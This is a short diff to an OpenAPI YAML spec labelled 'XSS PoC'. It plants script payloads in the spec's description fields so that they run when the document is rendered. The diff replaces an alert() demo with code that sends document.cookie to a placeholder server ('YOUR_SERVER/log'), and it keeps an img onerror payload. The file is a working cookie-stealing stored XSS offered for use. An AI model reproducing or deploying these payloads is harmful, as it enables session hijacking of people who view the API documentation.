@@ -4,14 +4,14 @@ info:
   version: "1.0"
   description: |
     <script>
-      alert("XSS Success! Your cookies: " + document.cookie);
+      new Image().src = "https://YOUR_SERVER/log?cookie=" + document.cookie;
     </script>
 paths:
   /test:
     get:
       summary: "XSS PoC"
       description: |
-        <img src="x" onerror="alert(document.cookie)">
+        <img src=x onerror="alert(document.cookie)">
       responses:
         "200":
           description: "OK"
